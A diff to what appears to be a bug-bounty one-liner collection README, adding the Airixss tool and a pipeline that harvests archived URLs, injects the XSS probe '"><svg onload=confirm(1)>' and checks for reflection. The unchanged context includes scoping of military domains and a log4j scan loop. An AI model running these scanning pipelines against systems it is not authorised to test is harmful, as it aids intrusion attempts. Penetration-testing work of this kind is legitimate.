@@ -47,6 +47,7 @@ To run the project, you will need to install the following programs:
 - [Anew](https://github.com/tomnomnom/anew)
 - [Anti-burl](https://github.com/tomnomnom/hacks/tree/master/anti-burl)
 - [Assetfinder](https://github.com/tomnomnom/assetfinder)
+- [Airixss](https://github.com/ferreiraklet/airixss)
 - [Axiom](https://github.com/pry0cc/axiom)
 - [Bhedak](https://github.com/R0X4R/bhedak)
 - [CF-check](https://github.com/dwisiswant0/cf-check)
@@ -111,6 +112,13 @@ bbrf inscope add '*.af.mil' '*.osd.mil' '*.marines.mil' '*.pentagon.mil' '*.disa
 ```bash
 bbrf domains | httpx -silent | xargs -I@ sh -c 'python3 http://log4j-scan.py -u "@"'
 ```
+
+###  Airixss XSS 
+- [Explained command](https://bit.ly/3tq5Hfv)
+```bash
+echo testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
+```
+
 
 ###  FREQ XSS 
 - [Explained command](https://bit.ly/3u8Qpeu)
